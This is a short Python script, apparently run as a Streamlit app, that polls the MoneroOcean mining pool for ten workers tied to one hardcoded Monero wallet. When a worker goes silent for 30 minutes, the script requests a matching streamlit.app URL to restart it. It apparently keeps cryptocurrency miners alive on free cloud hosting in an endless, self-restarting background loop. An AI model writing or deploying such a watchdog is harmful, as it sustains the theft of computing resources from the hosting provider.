import requests
import streamlit as st 
import json
import time
from multiprocessing import Process

pool = "https://api.moneroocean.stream/miner/"
addr ="49FrBm432j9fg33N8PrwSiSig7aTrxZ1wY4eELssmkmeESaYzk2fPkvfN7Kj4NHMfH11NuhUAcKc5DkP7jZQTvVGUnD243g"
stats ="/stats/"


def resp(worker):
  
  host = pool + addr + stats + worker
  res = requests.get(host)
  time.sleep(10)
  jde = json.loads(str(res.text))
  workt = jde[("lts")]
  t = time.time()
  lst = t - workt
  lstnt = lst / 60
  if lstnt >= 30:
    #mv3
    if worker == "mv3gen1":
      requests.get("https://vyom00907-mv3-mv3gen1-50plcc.streamlit.app/")
    if worker == "mv3gen2":
      requests.get("https://vyom00907-mv3-mv3gen2-raij5i.streamlit.app/")
    if worker == "mv3gen3":
      requests.get("https://vyom00907-mv3-mv3gen3-9t8981.streamlit.app/")
    if worker == "mv3gen4":
      requests.get("https://vyom00907-mv3-mv3gen4-2tysw5.streamlit.app/")
    if worker == "mv3gen5":
      requests.get("https://vyom00907-mv3-mv3gen5-azqk9g.streamlit.app/")
    if worker == "mv3gen6":
      requests.get("https://vyom00907-mv3-mv3gen6-lp1tyl.streamlit.app/")
    if worker == "mv3gen7":
      requests.get("https://vyom00907-mv3-mv3gen7-9h8igu.streamlit.app/")
    if worker == "mv3gen8":
      requests.get("https://vyom00907-mv3-mv3gen8-dsgciq.streamlit.app/")
    if worker == "mv3gen9":
      requests.get("https://vyom00907-mv3-mv3gen9-a113cm.streamlit.app/")
    if worker == "mv3gen10":
      requests.get("https://vyom00907-mv3-mv3gen10-t5r8ls.streamlit.app/")
    

      

def stch():
    while 1==1 :
      
      #mv3
      resp("mv3gen1")
      resp("mv3gen2")
      resp("mv3gen3")
      resp("mv3gen4")
      resp("mv3gen5")
      resp("mv3gen6")
      resp("mv3gen7")
      resp("mv3gen8")
      resp("mv3gen9")
      resp("mv3gen10")
      

def ch():
  try:
    stch()
  except:
    ch()

  
proc = Process(target=ch ,args=())
proc.start()

  
